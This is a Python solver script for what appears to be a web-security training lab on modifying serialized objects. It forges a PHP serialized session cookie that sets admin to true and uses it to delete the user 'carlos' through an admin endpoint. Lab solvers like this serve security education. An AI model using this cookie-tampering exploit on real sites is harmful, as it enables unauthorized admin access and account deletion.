import requests
from colorama import Fore
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Modifying serialized objects"


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Encode the serialized object after modifying\n2. Delete carlos from the admin panel with the modified object as session\n""")

    url = url.rstrip('/')

    print("[1] Encoding the serialized object after modifying")
    serialized = """O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}"""
    serialized_encoded = base64.b64encode(serialized.encode()).decode()

    print("[2] Deleting carlos from the admin panel with the modified object as session")
    cookies = {"session": serialized_encoded}

    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies, allow_redirects=False,
                 verify=False, proxies=proxies)
    return True
